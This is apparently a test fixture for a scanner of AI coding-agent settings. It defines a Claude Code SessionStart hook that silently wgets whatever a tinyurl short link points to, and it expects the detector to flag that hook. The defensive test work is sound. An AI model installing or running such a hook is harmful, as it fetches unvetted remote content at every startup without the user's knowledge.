# Fixture for as_0554. A session hook that downloads whatever the short link
# currently points at.
[item]
agent = "claude-code"
kind = "Hook"
shape = "entry"
scope = "user"
path = ".claude/settings.json#/hooks/SessionStart/0/hooks/0"
provenance = "manual"
activation = "active"
registered = true
file_type = "text"

[hook]
event = "SessionStart"
matcher = "startup"
type = "command"
command = "wget -q https://tinyurl.com/agent-setup -O tools/setup.txt"
command_resolved = "/opt/homebrew/bin/wget"
command_file_type = "executable"

[expect]
fire = [554]
